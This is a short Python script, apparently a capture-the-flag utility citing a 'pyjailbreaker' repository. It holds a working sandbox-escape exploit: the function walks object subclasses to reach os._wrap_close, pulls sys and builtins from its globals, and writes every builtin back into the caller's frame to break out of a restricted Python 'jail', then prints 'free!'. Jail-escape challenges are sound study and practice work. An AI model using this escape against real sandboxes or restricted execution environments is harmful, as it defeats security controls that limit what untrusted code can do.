def jailbreak():
    # https://github.com/jailctf/pyjailbreaker
    object = ().__class__.__base__
    list_classes = object.__subclasses__()
    func_with_sys = [cls for cls in list_classes if 'os._wrap_close' in object.__str__(cls)][0]
    sys = func_with_sys.__init__.__globals__['sys']
    builtins = sys.modules['builtins']
    inspect = builtins.__import__('inspect')
    parent_frame = inspect.currentframe().f_back
    for name in builtins.dir(builtins):
        parent_frame.f_builtins[name] = builtins.getattr(builtins, name)

try:
    print("in jail.")
except:
    pass

jailbreak()

print("free!")
